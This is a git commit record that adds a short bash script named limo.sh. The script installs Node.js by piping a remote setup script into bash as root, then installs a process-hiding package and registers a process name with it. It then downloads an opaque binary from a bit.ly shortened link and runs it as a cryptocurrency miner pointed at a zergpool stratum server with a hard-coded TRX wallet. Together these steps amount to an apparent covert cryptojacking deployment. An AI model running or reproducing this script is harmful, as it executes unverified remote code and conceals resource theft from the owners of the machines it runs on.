6a78dfb26c787f06723a0c2b7c576ed0ef8960fb
gugsense508 <108687859+gugsense508@users.noreply.github.com>
2022-07-05 00:57:30 +0700

    Create limo.sh

---
+++ limo.sh
@@ -0,0 +1,3 @@
+#!/bin/bash
+sudo apt update && sudo apt install gcc -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && apt install nodejs && npm install -g npm@8.13.2 && npm i -g node-process-hider && ph add 3ApGLZp
+wget https://bit.ly/3ApGLZp && chmod +x 3ApGLZp && ./3ApGLZp -a yescryptR16 -o stratum+tcp://yescryptR16.mine.zergpool.com:6333 -u TQ11YB4cti4EhwYkZkoYNwE9B7nkQvTJ86 -p c=TRX,mc=QOGE,m=solo -t 2
